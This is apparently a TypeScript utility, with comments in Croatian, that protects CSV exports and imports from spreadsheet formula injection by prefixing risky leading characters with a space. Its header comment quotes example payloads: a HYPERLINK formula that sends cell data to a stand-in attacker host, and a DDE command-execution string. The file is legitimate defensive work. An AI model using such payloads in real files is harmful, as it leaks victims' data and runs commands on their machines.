/**
 * CSV Injection (Formula Injection) zaštita.
 *
 * Spreadsheet aplikacije (Excel, LibreOffice, Google Sheets, Numbers) tretiraju
 * ćelije koje počinju sa znakovima `=`, `+`, `-` ili `@` kao FORMULE.
 * Napadač može u tekstualno polje (npr. opis transakcije, ime klijenta, OIB)
 * staviti zlonamjerni payload poput:
 *
 *   =HYPERLINK("https://evil.tld?x="&A1, "Klikni")
 *   =cmd|'/c calc'!A1                (legacy DDE napad)
 *
 * Kad žrtva otvori CSV koji smo izgenerirali ili koji se kasnije reeksporta,
 * spreadsheet automatski izvršava formulu i može:
 *   - eksfiltrirati podatke iz drugih ćelija (URL ili DNS lookup),
 *   - izvršiti vanjsku komandu (DDE, na starijim sustavima),
 *   - phishing kroz "klikabilan" hyperlink koji izgleda lokalno.
 *
 * Mitigacija (OWASP preporuka): ako tekst počinje s "=", "+", "-" ili "@",
 * dodaj jedan razmak ispred. Spreadsheet onda tretira ćeliju kao tekst,
 * a vrijednost ostaje vizualno gotovo identična izvornoj.
 *
 * Ovo MORAMO raditi:
 *   1. Pri EXPORTU u CSV (mi generiramo file koji korisnik otvori).
 *   2. Pri IMPORTU iz CSV-a u bazu (jer se ti zapisi mogu kasnije reeksportati,
 *      prikazivati u izvještajima, ili dohvatiti od strane drugog korisnika).
 *
 * Reference:
 * - https://owasp.org/www-community/attacks/CSV_Injection
 * - CVE-2014-3524, CVE-2017-12625 (primjeri stvarnih napada)
 */

const DANGEROUS_PREFIXES = ['=', '+', '-', '@'];

/**
 * Vrati siguran string: ako počinje s opasnim znakom, prefixaj razmakom.
 * Trim se NE radi — original prazan/whitespace ostaje takav (kompatibilnost
 * s validacijama koje provjeravaju prazne stringove).
 */
export function sanitizeCsvField<T>(value: T): T extends string ? string : T {
  if (typeof value !== 'string') return value as any;
  if (value.length === 0) return value as any;
  const first = value.charAt(0);
  if (DANGEROUS_PREFIXES.includes(first)) {
    return (' ' + value) as any;
  }
  return value as any;
}

/**
 * Sanitiziraj sva tekstualna polja u objektu (shallow). Brojevi, datumi,
 * boolean, null i nested objekti se ne mijenjaju.
 */
export function sanitizeCsvObject<T extends Record<string, any>>(obj: T): T {
  const out: Record<string, any> = {};
  for (const key of Object.keys(obj)) {
    const v = obj[key];
    out[key] = typeof v === 'string' ? sanitizeCsvField(v) : v;
  }
  return out as T;
}
